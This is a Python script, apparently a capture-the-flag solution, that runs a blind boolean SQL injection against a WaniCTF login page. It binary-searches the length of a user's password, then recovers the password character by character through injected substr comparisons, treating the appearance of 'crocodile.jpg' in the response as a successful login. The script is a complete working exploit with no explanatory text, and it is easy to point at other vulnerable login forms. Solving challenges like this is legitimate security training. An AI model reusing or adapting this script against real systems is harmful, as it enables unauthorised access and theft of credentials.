import requests
import json

url = 'https://watch.web.wanictf.org/'

upper = 100
lower = 0
passbefore = "' or (select length(password) from users where email = 'wanictf21spring@gmail.com') > "
passafter = "; --"

while upper - lower > 1:
    mid = (upper + lower)//2
    password = passbefore + str(mid) + passafter
    data = { 'email': 'wanictf21spring@gmail.com', 'password': '{}'.format(password) }
    r = requests.post(url, data=data)
    if "crocodile.jpg" in r.text:
        print("LOGIN OK ",mid,",",lower,",",upper)
        lower = mid
    else:
        print("LOGIN NG ",mid,",",lower,",",upper)
        upper = mid

num = lower

flag = ''
for count in range(1, num+2):
    for char_number in range(0,200):
        c = chr(char_number)
        sql = "' or substr((select password from users where email = 'wanictf21spring@gmail.com'), {}, 1)".format(count)
        sql += " = '{}'; --".format(c)
        payload = { "email" : "wanictf21spring@gmail.com", "password" : sql}
        r = requests.post(url, data=payload)
        if "crocodile.jpg" in r.text:
            flag += c
            break

print(flag)
